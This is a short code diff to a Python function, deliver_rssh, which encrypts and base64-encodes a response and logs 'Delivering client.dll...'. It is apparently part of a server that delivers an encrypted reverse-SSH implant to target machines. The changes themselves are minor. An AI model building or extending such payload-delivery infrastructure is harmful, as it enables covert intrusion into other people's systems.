@@ -255,8 +255,12 @@ def deliver_rssh():
     else:
         encrypt = encrypt_aes
 
+    if isinstance(response, str):
+        response = response.encode()
+
     encrypted = encrypt(response, hidden_app.key)
     resp = b64encode(encrypted)
+    log.info("Delivering client.dll...")
     return Response(
         resp,
         content_type='text/plain; charset=utf-8'
